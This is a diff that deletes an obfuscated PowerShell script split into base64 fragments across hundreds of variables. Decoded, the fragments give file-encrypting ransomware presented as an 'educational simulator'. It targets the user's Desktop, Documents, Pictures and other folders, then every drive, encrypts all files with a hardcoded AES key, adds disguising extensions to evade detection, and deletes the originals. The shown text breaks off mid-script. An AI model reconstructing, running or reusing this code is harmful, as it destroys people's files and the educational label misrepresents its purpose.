@@ -1,2484 +1,391 @@
-$lGEuEWpb = 'CgpXcml0ZS1Ib3N0ICI9';
-$fZZIMTVb = 'PT0gQWR2YW5jZWQgU2lt';
-$YBRETsXS = 'dWxhdG9yIHYyLjAgPT09';
-$szVXeRZb = 'IiAtRm9yZWdyb3VuZENv';
-$fKGZlfvX = 'bG9yIEN5YW4KV3JpdGUt';
-$uFTDszcF = 'SG9zdCAiRWR1Y2F0aW9u';
-$AuzlFMcd = 'YWwgdG9vbCBmb3IgY3li';
-$VhXJLDeo = 'ZXJzZWN1cml0eSBzdHVk';
-$mjpVtxBu = 'ZW50cyIgLUZvcmVncm91';
-$xJjuuRkS = 'bmRDb2xvciBHcmVlbgpX';
-$KcPRBdyg = 'cml0ZS1Ib3N0ICJEZW1v';
-$uxuNLkyG = 'bnN0cmF0ZXM6IEFFUyBl';
-$yYBQIHDx = 'bmNyeXB0aW9uLCBtdWx0';
-$cVqFZHkt = 'aS10aHJlYWRpbmcsIGV2';
-$gzxXLlYF = 'YXNpb24gdGVjaG5pcXVl';
-$sdBppOiX = 'cyIgLUZvcmVncm91bmRD';
-$ubcJJDxJ = 'b2xvciBZZWxsb3cKV3Jp';
-$jDxYRbKl = 'dGUtSG9zdCAiIgoKIyBD';
-$hxSUsgNO = 'b25maWd1cmF0aW9uIC0g';
-$nQHoAKyn = 'Tm8gc2l6ZSBsaW1pdHMg';
-$ZlBhROLT = 'Zm9yIHJlYWxpc3RpYyBz';
-$oqqZlBGp = 'aW11bGF0aW9uCiRDb25m';
-$MEaIRfhk = 'aWcgPSBAewogICAgRW5j';
-$JAZKgluu = 'cnlwdGlvbktleSA9ICJK';
-$qiWjUbMQ = 'c0QyVWt0emNhL1d0WWQy';
-$JYvCdGQk = 'TXkvUGphcHBDZFVicWlq';
-$whzQSUCy = 'SkFYcjE2N1Y2aW1ZPSIK';
-$fcuMnvLX = 'ICAgICMgUmVtb3ZlZCBN';
-$mnjuiXRE = 'YXhGaWxlU2l6ZSAtIGVu';
-$hbyxVInZ = 'Y3J5cHQgQUxMIGZpbGVz';
-$koPjYhsZ = 'IGZvdW5kCiAgICBNYXhU';
-$QXgmuLCH = 'aHJlYWRzID0gMTAgICMg';
-$JwPhmBUu = 'T3B0aW1pemVkIGZvciBz';
-$nIlitjTD = 'cGVlZAogICAgRXhjbHVk';
-$KkioyYUc = 'ZWRQYXRocyA9IEAoIkM6';
-$eeutDcmU = 'XFdpbmRvd3MiLCAiQzpc';
-$EjopCufz = 'UHJvZ3JhbSBGaWxlcyIs';
-$NJvwsGaD = 'ICJDOlxQcm9ncmFtIEZp';
-$xVttyyID = 'bGVzICh4ODYpIiwgIkM6';
-$JgKGWSRH = 'XCRSZWN5Y2xlLkJpbiIp';
-$tvVJXTeN = 'CiAgICAjIFN0ZWFsdGgg';
-$ryJfjUpD = 'ZXh0ZW5zaW9ucyBmb3Ig';
-$UUttryzB = 'ZW5jcnlwdGVkIGZpbGVz';
-$whodSlln = 'IChieXBhc3MgZGV0ZWN0';
-$sXvFqGHP = 'aW9uKQogICAgU3RlYWx0';
-$OWbCZFtx = 'aEV4dGVuc2lvbnMgPSBA';
-$jmDWfIyy = 'KCIudG1wIiwgIi5iYWsi';
-$CEkpBAjt = 'LCAiLm9sZCIsICIuYmFj';
-$PtedVgzr = 'a3VwIiwgIi50ZW1wIiwg';
-$rYnGLIJb = 'Ii5jYWNoZSIsICIuZGF0';
-$kaNjxCdL = 'IiwgIi5sb2ciKQogICAg';
-$iTdIBhXT = 'IyBQcmlvcml0eSBkaXJl';
-$DVkjdlwK = 'Y3RvcmllcyAtIGVuY3J5';
-$QTGmoUab = 'cHQgQUxMIGZpbGVzIGZv';
-$flJjJVTa = 'dW5kCiAgICBQcmlvcml0';
-$FkXhcjFK = 'eURpcnMgPSBAKAogICAg';
-$Brimerng = 'ICAgICIkZW52OlVTRVJQ';
-$PJstSMHj = 'Uk9GSUxFXERlc2t0b3Ai';
-$RMpiovNG = 'LAogICAgICAgICIkZW52';
-$iFjvqypZ = 'OlVTRVJQUk9GSUxFXERv';
-$VzwapPKE = 'Y3VtZW50cyIsCiAgICAg';
-$ueGmEJix = 'ICAgIiRlbnY6VVNFUlBS';
-$qwhPtGGa = 'T0ZJTEVcRG93bmxvYWRz';
-$kmofZxcr = 'IiwKICAgICAgICAiJGVu';
-$mKItytJh = 'djpVU0VSUFJPRklMRVxQ';
-$WPornOAy = 'aWN0dXJlcyIsCiAgICAg';
-$qidtkRnO = 'ICAgIiRlbnY6VVNFUlBS';
-$NHOYlMAj = 'T0ZJTEVcVmlkZW9zIiwK';
-$AdlHZrAJ = 'ICAgICAgICAiJGVudjpV';
-$mKrImbRR = 'U0VSUFJPRklMRVxNdXNp';
-$RfKPzuxW = 'YyIKICAgICkKfQoKIyBV';
-$AiAsWOKb = 'bHRyYS1mYXN0IGVuY3J5';
-$XreGXQHL = 'cHRpb24gZnVuY3Rpb24g';
-$gXNBFcnq = 'd2l0aCBzdGVhbHRoIGZl';
-$yxkrmJyn = 'YXR1cmVzCmZ1bmN0aW9u';
-$NWVgnGpR = 'IEVuY3J5cHQtRmlsZSB7';
-$NVWIMrWj = 'CiAgICBwYXJhbSgkRmls';
-$BaKgtuVB = 'ZVBhdGgsICRLZXksICRT';
-$koIBYFrO = 'dGVhbHRoRXh0ZW5zaW9u';
-$zIoWFaTt = 'cykKICAgIHRyeSB7CiAg';
-$JKjsHRYb = 'ICAgICAgIyBVc2UgZmFz';
-$NujSMCMQ = 'dGVyIC5ORVQgY3J5cHRv';
-$ghuSaBWI = 'IGNsYXNzZXMKICAgICAg';
-$bKRJmKqz = 'ICAkYWVzID0gTmV3LU9i';
-$uzcXDvUM = 'amVjdCBTeXN0ZW0uU2Vj';
-$wYzmgyvV = 'dXJpdHkuQ3J5cHRvZ3Jh';
-$ahTFLvud = 'cGh5LkFlc0NyeXB0b1Nl';
-$wDmMaRGz = 'cnZpY2VQcm92aWRlcgog';
-$uClbhhOP = 'ICAgICAgICRhZXMuS2V5';
-$MGahakdp = 'ID0gW1N5c3RlbS5Db252';
-$sMmAWCpJ = 'ZXJ0XTo6RnJvbUJhc2U2';
-$jjqHEqSH = 'NFN0cmluZygkS2V5KQog';
-$XkWAXTuc = 'ICAgICAgICRhZXMuR2Vu';
-$nzvTrCVF = 'ZXJhdGVJVigpCiAgICAg';
-$AfnSQTFw = 'ICAgJGFlcy5Nb2RlID0g';
-$izdEgKPv = 'W1N5c3RlbS5TZWN1cml0';
-$mQyKAlcC = 'eS5DcnlwdG9ncmFwaHku';
-$ivPnukMM = 'Q2lwaGVyTW9kZV06OkNC';
-$vkRJUpzQ = 'QwogICAgICAgICRhZXMu';
-$ILLftMgH = 'UGFkZGluZyA9IFtTeXN0';
-$blGTQcnS = 'ZW0uU2VjdXJpdHkuQ3J5';
-$gXihHSQR = 'cHRvZ3JhcGh5LlBhZGRp';
-$SJpsrjFO = 'bmdNb2RlXTo6UEtDUzcK';
-$jgmRvLms = 'CiAgICAgICAgIyBSZWFk';
-$nQbSMnpj = 'IGZpbGUgZWZmaWNpZW50';
-$WSWCDNJB = 'bHkKICAgICAgICAkaW5w';
-$KxDKXyVF = 'dXRCeXRlcyA9IFtTeXN0';
-$pdzfHldu = 'ZW0uSU8uRmlsZV06OlJl';
-$AnwjHmoD = 'YWRBbGxCeXRlcygkRmls';
-$DdBMfCDu = 'ZVBhdGgpCgogICAgICAg';
-$OkyKFaOo = 'ICMgRW5jcnlwdAogICAg';
-$wyYuLOAj = 'ICAgICRlbmNyeXB0b3Ig';
-$vBYWEfhj = 'PSAkYWVzLkNyZWF0ZUVu';
-$KryxsghM = 'Y3J5cHRvcigpCiAgICAg';
-$oncdImAu = 'ICAgJGVuY3J5cHRlZEJ5';
-$YDCJUoFd = 'dGVzID0gJGVuY3J5cHRv';
-$CkNTYafM = 'ci5UcmFuc2Zvcm1GaW5h';
-$JGOWJJRS = 'bEJsb2NrKCRpbnB1dEJ5';
-$EYPyfJxF = 'dGVzLCAwLCAkaW5wdXRC';
-$pqiSjFOB = 'eXRlcy5MZW5ndGgpCgog';
-$MnpPdgKL = 'ICAgICAgICMgQ29tYmlu';
-$TdjKtAYf = 'ZSBJViArIGVuY3J5cHRl';
-$ruQaBTzx = 'ZCBkYXRhCiAgICAgICAg';
-$nCqERsIs = 'JHJlc3VsdCA9IE5ldy1P';
-$wSgwGpjI = 'YmplY3QgYnl0ZVtdICgk';
-$BhIfQyfT = 'YWVzLklWLkxlbmd0aCAr';
-$takYvdof = 'ICRlbmNyeXB0ZWRCeXRl';
-$qIbDJRXs = 'cy5MZW5ndGgpCiAgICAg';
-$qbPVpLiO = 'ICAgW1N5c3RlbS5BcnJh';
-$ZYKfJuWj = 'eV06OkNvcHkoJGFlcy5J';
-$poyKcKDH = 'ViwgMCwgJHJlc3VsdCwg';
-$RqtLuUiE = 'MCwgJGFlcy5JVi5MZW5n';
-$bwTakFCs = 'dGgpCiAgICAgICAgW1N5';
-$xkSWMoVz = 'c3RlbS5BcnJheV06OkNv';
-$LTXjfzKZ = 'cHkoJGVuY3J5cHRlZEJ5';
-$LUtZMSTx = 'dGVzLCAwLCAkcmVzdWx0';
-$LpRKysCF = 'LCAkYWVzLklWLkxlbmd0';
-$hqMPFHEz = 'aCwgJGVuY3J5cHRlZEJ5';
-$ZWHTXAGV = 'dGVzLkxlbmd0aCkKCiAg';
-$uXBfyaUx = 'ICAgICAgIyBTdGVhbHRo';
-$KgZpDzwA = 'OiBVc2UgcmFuZG9tIGV4';
-$VbyfxpuI = 'dGVuc2lvbiB0byBieXBh';
-$MLfnKvfV = 'c3MgZGV0ZWN0aW9uCiAg';
-$ZuDtfEre = 'ICAgICAgJHJhbmRvbUV4';
-$SYkeQbVe = 'dGVuc2lvbiA9ICRTdGVh';
-$GniYGMkz = 'bHRoRXh0ZW5zaW9ucyB8';
-$cywMtXuz = 'IEdldC1SYW5kb20KICAg';
-$EfbMNzmm = 'ICAgICAkb3V0cHV0UGF0';
-$clOdMvws = 'aCA9ICRGaWxlUGF0aCAr';
-$uIYLnDbA = 'ICRyYW5kb21FeHRlbnNp';
-$vgWrRLJg = 'b24KCiAgICAgICAgIyBX';
-$gdgrAWFo = 'cml0ZSBvdXRwdXQgd2l0';
-$HpNQwySn = 'aCBzdGVhbHRoIGV4dGVu';
-$BNVReiMp = 'c2lvbgogICAgICAgIFtT';
-$NDuOXQeE = 'eXN0ZW0uSU8uRmlsZV06';
-$hiOevvvy = 'OldyaXRlQWxsQnl0ZXMo';
-$jfuWMtKd = 'JG91dHB1dFBhdGgsICRy';
-$WIDbEzOA = 'ZXN1bHQpCgogICAgICAg';
-$ZRnpKwvX = 'ICMgUmVtb3ZlIG9yaWdp';
-$gpRbMeCP = 'bmFsIChmYXN0IGRlbGV0';
-$vBfjTpKn = 'aW9uKQogICAgICAgIFtT';
-$ZtouKEmQ = 'eXN0ZW0uSU8uRmlsZV06';
-$CVauICrY = 'OkRlbGV0ZSgkRmlsZVBh';
-$lRPGBnIs = 'dGgpCgogICAgICAgICRh';
-$oqdTXABz = 'ZXMuRGlzcG9zZSgpCiAg';
-$qoViinan = 'ICAgICAgcmV0dXJuICRv';
-$XnHKpmuo = 'dXRwdXRQYXRoICAjIFJl';
-$aylQFIog = 'dHVybiB0aGUgbmV3IHBh';
-$QbVdTnXy = 'dGggZm9yIHRyYWNraW5n';
-$GEWKrGGh = 'CiAgICB9IGNhdGNoIHsK';
-$tsppXMjY = 'ICAgICAgICByZXR1cm4g';
-$ZlFxWrpD = 'JG51bGwKICAgIH0KfQoK';
-$dYKMCtMg = 'IyBVbHRyYS1jb21wcmVo';
-$oRzhCKKn = 'ZW5zaXZlIHJlY3Vyc2l2';
-$VgMukVwc = 'ZSBmaWxlIHNjYW5uZXIg';
-$gtZWndoa = 'LSBOTyBTSVpFIExJTUlU';
-$ATfralij = 'UwpmdW5jdGlvbiBGaW5k';
-$SmRVmVgZ = 'LVRhcmdldEZpbGVzUHJp';
-$xCPsMHEb = 'b3JpdHkgewogICAgcGFy';
-$CNQiqejr = 'YW0oJFBhdGhzKQogICAg';
-$YsqAMVif = 'JGZpbGVzID0gTmV3LU9i';
-$gxhuJEtW = 'amVjdCBTeXN0ZW0uQ29s';
-$InuFfVkH = 'bGVjdGlvbnMuR2VuZXJp';
-$WZpeklCv = 'Yy5MaXN0W1N5c3RlbS5J';
-$KjMKRKTI = 'Ty5GaWxlSW5mb10KCiAg';
-$LgSofniw = 'ICBXcml0ZS1Ib3N0ICIg';
-$Ysbcgflv = 'IPCfjq8gU2Nhbm5pbmcg';
-$eGyjZQdV = 'cHJpb3JpdHkgZGlyZWN0';
-$EopyHlob = 'b3JpZXMgcmVjdXJzaXZl';
-$tIqeirQs = 'bHkgKEFMTCBGSUxFUyku';
-$rSDjQjZN = 'Li4iIC1Gb3JlZ3JvdW5k';
-$aBUGEiUQ = 'Q29sb3IgTWFnZW50YQoK';
-$OYSSuqvO = 'ICAgIGZvcmVhY2ggKCRw';
-$vaFZSKHu = 'YXRoIGluICRQYXRocykg';
-$bQpWfZuq = 'ewogICAgICAgIGlmIChU';
-$ppIQqKuk = 'ZXN0LVBhdGggJHBhdGgp';
-$uvcbFwIR = 'IHsKICAgICAgICAgICAg';
-$OJkRrezw = 'V3JpdGUtSG9zdCAiICAg';
-$ZRQKccSm = 'IPCfk4EgU2Nhbm5pbmcg';
-$EmxDTXrN = 'JCgoW1N5c3RlbS5JTy5Q';
-$VcDiEvQb = 'YXRoXTo6R2V0RmlsZU5h';
-$JdcnlGpk = 'bWUoJHBhdGgpKSkgYW5k';
-$LpDFtLMk = 'IEFMTCBzdWJmb2xkZXJz';
-$UyskhpFh = 'Li4uIiAtRm9yZWdyb3Vu';
-$xYkPlhOQ = 'ZENvbG9yIEN5YW4KCiAg';
-$jpqLeswL = 'ICAgICAgICAgICMgRmly';
-$shSMKiPr = 'c3QgY2hlY2sgaWYgZGly';
-$rveIJkEC = 'ZWN0b3J5IGhhcyBhbnkg';
-$DaaLjstg = 'ZmlsZXMgYXQgYWxsCiAg';
-$ahjniQAp = 'ICAgICAgICAgICRxdWlj';
-$cysylgJJ = 'a0NoZWNrID0gR2V0LUNo';
-$WtsreMGA = 'aWxkSXRlbSAtUGF0aCAk';
-$VQvjOPxr = 'cGF0aCAtRmlsZSAtRXJy';
-$lPnxsSmn = 'b3JBY3Rpb24gU2lsZW50';
-$eAiaeQhL = 'bHlDb250aW51ZQogICAg';
-$elYzHmLQ = 'ICAgICAgICBXcml0ZS1I';
-$MioftsKw = 'b3N0ICIgICAgICDwn5OK';
-$cDrulaws = 'IEZvdW5kICQoJHF1aWNr';
-$oFRjWarX = 'Q2hlY2suQ291bnQpIGZp';
-$ZhvihTJl = 'bGVzIGluIHJvb3QgZGly';
-$UijcTOGm = 'ZWN0b3J5IiAtRm9yZWdy';
-$FXvaKWsh = 'b3VuZENvbG9yIFdoaXRl';
-$VLFcGSvq = 'CgogICAgICAgICAgICAj';
-$rTkXHlLZ = 'IFVzZSBQb3dlclNoZWxs';
-$chIEEXLQ = 'J3MgR2V0LUNoaWxkSXRl';
-$pKZZNlxH = 'bSB3aXRoIC1SZWN1cnNl';
-$PyWKwmdk = 'IGZvciBndWFyYW50ZWVk';
-$gPXKXBxc = 'IHJlY3Vyc2l2ZSBzY2Fu';
-$GGtxnqtp = 'bmluZwogICAgICAgICAg';
-$ATKemsYC = 'ICB0cnkgewogICAgICAg';
-$GLTyrtgI = 'ICAgICAgICAgJGFsbEZp';
-$VzWAHmCz = 'bGVzID0gR2V0LUNoaWxk';
-$dNfwTpZX = 'SXRlbSAtUGF0aCAkcGF0';
-$ZxhdLmcx = 'aCAtUmVjdXJzZSAtRmls';
-$TtLOLmsm = 'ZSAtRXJyb3JBY3Rpb24g';
-$vBiZsuBS = 'U2lsZW50bHlDb250aW51';
-$mXIBmaWU = 'ZQogICAgICAgICAgICAg';
-$AFEWVOuG = 'ICAgV3JpdGUtSG9zdCAi';
-$armDBivv = 'ICAgICAg8J+UjSBUb3Rh';
-$EhKNGPYO = 'bCBmaWxlcyBmb3VuZCBy';
-$JfsNNKkS = 'ZWN1cnNpdmVseTogJCgk';
-$ZzGGaOte = 'YWxsRmlsZXMuQ291bnQp';
-$CGSHUuzW = 'IiAtRm9yZWdyb3VuZENv';
-$QaexHIAn = 'bG9yIEN5YW4KCiAgICAg';
-$kZPCOWcf = 'ICAgICAgICAgICAkZGly';
-$FRvPcHXD = 'RmlsZUNvdW50ID0gMAog';
-$XhPWgtXw = 'ICAgICAgICAgICAgICAg';
-$dfLzbedE = 'Zm9yZWFjaCAoJGZpbGUg';
-$evDOmFTP = 'aW4gJGFsbEZpbGVzKSB7';
-$qPdJLJqf = 'CiAgICAgICAgICAgICAg';
-$nlmumRTb = 'ICAgICAgdHJ5IHsKICAg';
-$ZLUFEClG = 'ICAgICAgICAgICAgICAg';
-$GMrwfExc = 'ICAgICAgIyBFbmNyeXB0';
-$LwjGhGoz = 'IEFMTCBmaWxlcyBmb3Vu';
-$aBifSqeP = 'ZCAobm8gc2l6ZSBsaW1p';
-$YFnOQWsN = 'dCkKICAgICAgICAgICAg';
-$hXfTiXlA = 'ICAgICAgICAgICAgaWYg';
-$cqqiDJBx = 'KCRmaWxlLkxlbmd0aCAt';
-$jhQZbZxr = 'Z3QgMCkgeyAgIyBKdXN0';
-$qFJKUzeg = 'IGVuc3VyZSBmaWxlIGlz';
-$RbMtzNpy = 'IG5vdCBlbXB0eQogICAg';
-$HpIUGyaD = 'ICAgICAgICAgICAgICAg';
-$YWpbXxCB = 'ICAgICAgICAgJGZpbGVz';
-$bCADlndi = 'LkFkZCgkZmlsZSkKICAg';
-$xmQGzmGj = 'ICAgICAgICAgICAgICAg';
-$lhCWVWZb = 'ICAgICAgICAgICRkaXJG';
-$FNrBgZSb = 'aWxlQ291bnQrKwogICAg';
-$DomRHbUN = 'ICAgICAgICAgICAgICAg';
-$eLXZOOIh = 'ICAgICAgICAgaWYgKCRk';
-$ArKgSBqa = 'aXJGaWxlQ291bnQgJSA1';
-$vyFivQfp = 'MCAtZXEgMCkgewogICAg';
-$kCxuBxCY = 'ICAgICAgICAgICAgICAg';
-$uzgBXIKY = 'ICAgICAgICAgICAgIFdy';
-$JLgIdAKx = 'aXRlLUhvc3QgIiAgICAg';
-$qNZwtGkA = 'ICAg8J+ThCBBZGRlZCAk';
-$TSjXccUn = 'ZGlyRmlsZUNvdW50IGZp';
-$zIDqWuhD = 'bGVzIHNvIGZhciBmcm9t';
-$ICUFMYdL = 'ICQoKFtTeXN0ZW0uSU8u';
-$dwsrBerY = 'UGF0aF06OkdldEZpbGVO';
-$bYqJjkkQ = 'YW1lKCRwYXRoKSkpLi4u';
-$jQwNCxGk = 'IiAtRm9yZWdyb3VuZENv';
-$EoFftcYI = 'bG9yIEdyYXkKICAgICAg';
-$TbaDTTBf = 'ICAgICAgICAgICAgICAg';
-$QGEMnNlw = 'ICAgICAgIH0KICAgICAg';
-$BflfhXso = 'ICAgICAgICAgICAgICAg';
-$PHwcFghP = 'ICAgfQogICAgICAgICAg';
-$ABXOjtnU = 'ICAgICAgICAgIH0gY2F0';
-$DlTmGWcO = 'Y2ggeyB9CiAgICAgICAg';
-$niGeZSkb = 'ICAgICAgICB9CiAgICAg';
-$paEHeitn = 'ICAgICAgICAgICBXcml0';
-$aayHZjCZ = 'ZS1Ib3N0ICIgICAgICDi';
-$bSUESfMG = 'nIUgQWRkZWQgJGRpckZp';
-$pBhJQcjR = 'bGVDb3VudCBmaWxlcyBm';
-$nTJTkmdK = 'cm9tICQoKFtTeXN0ZW0u';
-$iPATbQIR = 'SU8uUGF0aF06OkdldEZp';
-$CeYRVdTZ = 'bGVOYW1lKCRwYXRoKSkp';
-$HeelaQJs = 'IiAtRm9yZWdyb3VuZENv';
-$KdadPBTP = 'bG9yIEdyZWVuCiAgICAg';
-$AKuoXzMd = 'ICAgICAgIH0gY2F0Y2gg';
-$zbVymPwh = 'ewogICAgICAgICAgICAg';
-$SQvsSNBj = 'ICAgV3JpdGUtSG9zdCAi';
-$QWdSLaDQ = 'ICAgICAg4pqg77iPICBD';
-$MhZaHFAf = 'b3VsZCBub3QgZnVsbHkg';
-$PPtGyPJf = 'c2NhbiAkcGF0aCIgLUZv';
-$cbZobDoe = 'cmVncm91bmRDb2xvciBZ';
-$kpAZkWOU = 'ZWxsb3cKICAgICAgICAg';
-$fByPRpwU = 'ICAgfQogICAgICAgIH0g';
-$TPMGEaFE = 'ZWxzZSB7CiAgICAgICAg';
-$cmdWVwHT = 'ICAgIFdyaXRlLUhvc3Qg';
-$mbBPMaet = 'IiAgICDinYwgRGlyZWN0';
-$HWdEiqjG = 'b3J5IG5vdCBmb3VuZDog';
-$KjOeiYAc = 'JHBhdGgiIC1Gb3JlZ3Jv';
-$HNZIoIdw = 'dW5kQ29sb3IgUmVkCiAg';
-$VRVKSPbS = 'ICAgICAgfQogICAgfQoK';
-$QWgnBQAN = 'ICAgICMgSWYgbm8gZmls';
-$kDVGZBUk = 'ZXMgZm91bmQgaW4gcHJp';
-$kdhPiQMe = 'b3JpdHkgZGlyZWN0b3Jp';
-$aNTgKbhn = 'ZXMsIHNjYW4gQUxMIGRy';
-$tjXPzISA = 'aXZlcyByZWN1cnNpdmVs';
-$kppRDuEm = 'eQogICAgaWYgKCRmaWxl';
-$HyXctGpg = 'cy5Db3VudCAtZXEgMCkg';
-$EjjAaeZz = 'ewogICAgICAgIFdyaXRl';
-$hrlrdLNv = 'LUhvc3QgIiAg8J+TgiBO';
-$SXSBCPPN = 'byBmaWxlcyBpbiBwcmlv';
-$kIobRcIM = 'cml0eSBkaXJlY3Rvcmll';
-$rlaWQZVg = 'cywgc2Nhbm5pbmcgQUxM';
-$ySWHcrVt = 'IGRyaXZlcyByZWN1cnNp';
-$lKPochdw = 'dmVseS4uLiIgLUZvcmVn';
-$PelPpPem = 'cm91bmRDb2xvciBZZWxs';
-$ctkbPiPm = 'b3cKICAgICAgICAkYWxs';
-$EeLaKrwe = 'RHJpdmVzID0gR2V0LVBT';
-$LNCgfuSh = 'RHJpdmUgLVBTUHJvdmlk';
-$ZoNWTFcs = 'ZXIgRmlsZVN5c3RlbSB8';
-$skIDQfxo = 'IFdoZXJlLU9iamVjdCB7';
-$jkcFfcEC = 'ICRfLk5hbWUgLW1hdGNo';
-$NVGSahjP = 'ICdeW0EtWl0kJyB9IHwg';
-$bmDFobsq = 'U2VsZWN0LU9iamVjdCAt';
-$EpQFAHNC = 'RXhwYW5kUHJvcGVydHkg';
-$GhABAgPc = 'Um9vdAoKICAgICAgICBm';
-$POoOqqKA = 'b3JlYWNoICgkZHJpdmUg';
-$qUfmDkPN = 'aW4gJGFsbERyaXZlcykg';
-$WpKzrQda = 'ewogICAgICAgICAgICBp';
-$NagHWpDt = 'ZiAoVGVzdC1QYXRoICRk';
-$UOFRDMvH = 'cml2ZSkgewogICAgICAg';
-$yrtFouCn = 'ICAgICAgICAgV3JpdGUt';
-$QPFatjXE = 'SG9zdCAiICAgIPCfkr0g';
-$tnOwlLwM = 'RGVlcCBzY2FubmluZyBk';
-$iPrxEjUu = 'cml2ZSAkZHJpdmUgYW5k';
-$qTSBZzsc = 'IEFMTCBzdWJmb2xkZXJz';
-$LibOcLLt = 'Li4uIiAtRm9yZWdyb3Vu';
-$rHANlOrs = 'ZENvbG9yIEN5YW4KICAg';
-$HJXTgLPU = 'ICAgICAgICAgICAgIHRy';
-$JjlASVAZ = 'eSB7CiAgICAgICAgICAg';
-$TfbvIuqj = 'ICAgICAgICAgIyBVc2Ug';
-$vqnKVTMu = 'R2V0LUNoaWxkSXRlbSBm';
-$pGqtoEXI = 'b3IgZ3VhcmFudGVlZCBy';
-$TUkLSZcx = 'ZWN1cnNpdmUgc2Nhbm5p';
-$JsSFxsNp = 'bmcKICAgICAgICAgICAg';
-$BiuTgZeW = 'ICAgICAgICAkZHJpdmVG';
-$pZXDwpci = 'aWxlcyA9IEdldC1DaGls';
-$wmHHGqWE = 'ZEl0ZW0gLVBhdGggJGRy';
-$kfhGrQPr = 'aXZlIC1SZWN1cnNlIC1G';
-$yxRAcHWn = 'aWxlIC1FcnJvckFjdGlv';
-$WWZxZazt = 'biBTaWxlbnRseUNvbnRp';
-$RTCsIwPN = 'bnVlCgogICAgICAgICAg';
-$ctHEnzrJ = 'ICAgICAgICAgICRkcml2';
-$QNnCZQoG = 'ZUZpbGVDb3VudCA9IDAK';
-$eIXFGlVW = 'ICAgICAgICAgICAgICAg';
-$zViQSwyh = 'ICAgICBmb3JlYWNoICgk';
-$YSQsCwhm = 'ZmlsZSBpbiAkZHJpdmVG';
-$YTKWVhFS = 'aWxlcykgewogICAgICAg';
-$YzMKWfYx = 'ICAgICAgICAgICAgICAg';
-$dTNJVUJs = 'ICB0cnkgewogICAgICAg';
-$cDMwTtyE = 'ICAgICAgICAgICAgICAg';
-$YEdiJmyI = 'ICAgICAgIyBTa2lwIHN5';
-$ezBNibLQ = 'c3RlbSBkaXJlY3Rvcmll';
-$rCrNJyxC = 'cyBmb3Igc2FmZXR5LCBi';
-$EELwgLVB = 'dXQgZW5jcnlwdCBBTEwg';
-$uwlnOEjJ = 'b3RoZXIgZmlsZXMKICAg';
-$lpqAFCmu = 'ICAgICAgICAgICAgICAg';
-$FmjiqxoG = 'ICAgICAgICAgIGlmICgk';
-$iLknQZal = 'ZmlsZS5MZW5ndGggLWd0';
-$mlbusazy = 'IDAgLWFuZAogICAgICAg';
-$PMfqPpIW = 'ICAgICAgICAgICAgICAg';
-$UMxgLzNv = 'ICAgICAgICAgIC1ub3Qg';
-$RvhwMZnS = 'KCRmaWxlLkRpcmVjdG9y';
-$cnFYhFBP = 'eU5hbWUgLWxpa2UgIipX';
-$HkjpxBkb = 'aW5kb3dzKiIgLW9yCiAg';
-$KMgcKugd = 'ICAgICAgICAgICAgICAg';
-$TpLdxsjE = 'ICAgICAgICAgICAgICAg';
-$GzROjGiu = 'ICAgICAgJGZpbGUuRGly';
-$bMrFbTVF = 'ZWN0b3J5TmFtZSAtbGlr';
-$KkwUAtOf = 'ZSAiKlByb2dyYW0gRmls';
-$AfZvmPRg = 'ZXMqIikpIHsKICAgICAg';
-$WiMguixo = 'ICAgICAgICAgICAgICAg';
-$lTsmAMPK = 'ICAgICAgICAgICAkZmls';
-$iTPSywtq = 'ZXMuQWRkKCRmaWxlKQog';
-$KZJyUnbj = 'ICAgICAgICAgICAgICAg';
-$OCTFKHAr = 'ICAgICAgICAgICAgICAg';
-$wLUwlyhq = 'ICRkcml2ZUZpbGVDb3Vu';
-$DcRPVMdA = 'dCsrCiAgICAgICAgICAg';
-$ghEWljaI = 'ICAgICAgICAgICAgICAg';
-$osMtvLQh = 'ICAgICAgaWYgKCRkcml2';
-$exMUUlCe = 'ZUZpbGVDb3VudCAlIDEw';
-$vbZumCMk = 'MCAtZXEgMCkgewogICAg';
-$zcZZtwmm = 'ICAgICAgICAgICAgICAg';
-$TpJWBwvU = 'ICAgICAgICAgICAgICAg';
-$ItEjLfHl = 'ICBXcml0ZS1Ib3N0ICIg';
-$wBHzFRgu = 'ICAgICDwn5OKIEZvdW5k';
-$ofkhfKEX = 'ICRkcml2ZUZpbGVDb3Vu';
-$yqXaXTyu = 'dCBmaWxlcyBzbyBmYXIg';
-$wPzMwnUv = 'b24gJGRyaXZlLi4uIiAt';
-$hzBOWtyo = 'Rm9yZWdyb3VuZENvbG9y';
-$mCNqGiKq = 'IEdyYXkKICAgICAgICAg';
-$nRURxXop = 'ICAgICAgICAgICAgICAg';
-$qtOcZjCp = 'ICAgICAgICB9CiAgICAg';
-$DhrDqAyd = 'ICAgICAgICAgICAgICAg';
-$QQBTbkLV = 'ICAgICAgICB9CiAgICAg';
-$VUVsZYof = 'ICAgICAgICAgICAgICAg';
-$JxLtFbJw = 'ICAgIH0gY2F0Y2ggeyB9';
-$jJntFPLE = 'CiAgICAgICAgICAgICAg';
-$AbMhfOHj = 'ICAgICAgfQogICAgICAg';
-$IsFlKfrT = 'ICAgICAgICAgICAgIFdy';
-$BEghAerk = 'aXRlLUhvc3QgIiAgICAg';
-$vUykuXFo = 'IOKchSBGb3VuZCAkZHJp';
-$wUotSYvT = 'dmVGaWxlQ291bnQgc3Vp';
-$gQdYjOog = 'dGFibGUgZmlsZXMgb24g';
-$MbpqNbNE = 'JGRyaXZlIiAtRm9yZWdy';
-$BSSbnxhy = 'b3VuZENvbG9yIEdyZWVu';
-$QjIEujGh = 'CiAgICAgICAgICAgICAg';
-$BfCfhdyU = 'ICB9IGNhdGNoIHsKICAg';
-$YpTOGQAl = 'ICAgICAgICAgICAgICAg';
-$wbbDWFWX = 'ICBXcml0ZS1Ib3N0ICIg';
-$xpPKzHhP = 'ICAgICDimqDvuI8gIENv';
-$doLFqsjM = 'dWxkIG5vdCBzY2FuIGRy';
-$DixfAXSw = 'aXZlICRkcml2ZSIgLUZv';
-$wdXDqrBa = 'cmVncm91bmRDb2xvciBZ';
-$xMPMZofr = 'ZWxsb3cKICAgICAgICAg';
-$foHuRGWl = 'ICAgICAgIH0KICAgICAg';
-$RhJFEcAJ = 'ICAgICAgfQogICAgICAg';
-$aAYZdcoE = 'IH0KICAgIH0KCiAgICAj';
-$NJsmmbxn = 'IElmIHN0aWxsIG5vIGZp';
-$WAyysMzr = 'bGVzIGZvdW5kLCBjcmVh';
-$sfGNYYnT = 'dGUgdGVzdCBmaWxlcyBp';
-$kcmHBMnt = 'biBwcmlvcml0eSBkaXJl';
-$zuwWmzYR = 'Y3RvcmllcwogICAgaWYg';
-$hTMAVNmW = 'KCRmaWxlcy5Db3VudCAt';
